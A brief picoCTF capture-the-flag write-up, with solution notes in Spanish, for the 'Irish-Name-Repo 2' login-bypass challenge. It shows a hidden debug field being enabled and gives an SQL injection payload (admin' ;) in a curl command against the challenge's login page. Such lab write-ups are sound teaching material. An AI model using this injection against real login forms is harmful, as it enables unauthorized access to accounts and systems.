#  Irish-Name-Repo 2

#### Description
There is a website running at `https://jupiter.challenges.picoctf.org/problem/64649/` ([link](https://jupiter.challenges.picoctf.org/problem/64649/)). Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login! or http://jupiter.challenges.picoctf.org:64649

## Hints
### 1
The password is being filtered.

## Solucion
Con el ispector vemos el campo oculto y cambiamos el valor a 1
para poder ver la consulta SQL

admin' ;

```bash
curl https://jupiter.challenges.picoctf.org/problem/64649/login.html -d "username=admin';&password=pass&debug=1"
```
